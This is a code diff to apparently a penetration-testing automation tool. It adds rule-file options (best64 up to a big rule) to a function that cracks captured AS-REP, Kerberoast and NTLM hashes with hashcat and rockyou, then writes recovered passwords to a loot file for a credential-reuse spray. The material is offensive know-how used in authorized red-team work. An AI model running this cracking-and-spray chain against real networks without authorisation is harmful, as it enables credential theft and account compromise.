@@ -15,6 +15,7 @@ from pathlib import Path
 
 from lib import ui
 from lib.runner import Runner
+from lib.wordlists import Breadth, crack_rule_file
 from lib.workspace import Workspace
 
 # loot filename → (hashcat mode, human label, needs --username)
@@ -71,16 +72,24 @@ def _parse_show(output: str) -> list[tuple[str, str]]:
     return results
 
 
-def crack_hashes(ws: Workspace, runner: Runner, findings, available: set[str]) -> list[tuple[str, str]]:
+def crack_hashes(ws: Workspace, runner: Runner, findings, available: set[str],
+                 breadth: Breadth = Breadth.CONCISE) -> list[tuple[str, str]]:
     """
     Crack any captured AS-REP / Kerberoast / NTLM hashes with rockyou and feed
     plaintext passwords into loot/creds_found.txt for the cred-reuse spray.
+
+    `breadth` scales effort: CONCISE = straight rockyou (fast, the default);
+    STANDARD/BROAD layer a hashcat rule file (best64 → big rule) for far more
+    candidates at the cost of time. Resolution is graceful — a missing rule file
+    steps down rather than failing.
 
     Returns the list of newly cracked (username, password) pairs. Safe to call
     when no hashes exist or hashcat is missing — it just returns [].
     """
     if "hashcat" not in available:
         return []
+
+    rule_file = crack_rule_file(breadth)
 
     jobs = [(fn, mode, label, uname) for fn, mode, label, uname in _HASH_JOBS
             if (ws.loot_dir / fn).exists() and (ws.loot_dir / fn).stat().st_size > 0]
@@ -93,7 +102,8 @@ def crack_hashes(ws: Workspace, runner: Runner, findings, available: set[str]) -
         findings.note("rockyou.txt not found in standard paths — skipping auto-crack")
         return []
 
-    findings.h2("Offline Cracking (hashcat + rockyou)")
+    rule_note = f" + {Path(rule_file).name}" if rule_file else ""
+    findings.h2(f"Offline Cracking (hashcat + rockyou{rule_note})")
     potfile = ws.loot_dir / "hashcat.potfile"
     cracked_path = ws.loot_dir / "cracked.txt"
     cracked_seen = {l.strip() for l in cracked_path.read_text().splitlines()} if cracked_path.exists() else set()
@@ -114,6 +124,8 @@ def crack_hashes(ws: Workspace, runner: Runner, findings, available: set[str]) -
             "-O", "--force", "--quiet",
             "--runtime", str(_RUNTIME_CAP),
         ]
+        if rule_file:
+            attack += ["-r", rule_file]
         if needs_username:
             attack.append("--username")
         findings.cmd(" ".join(attack))
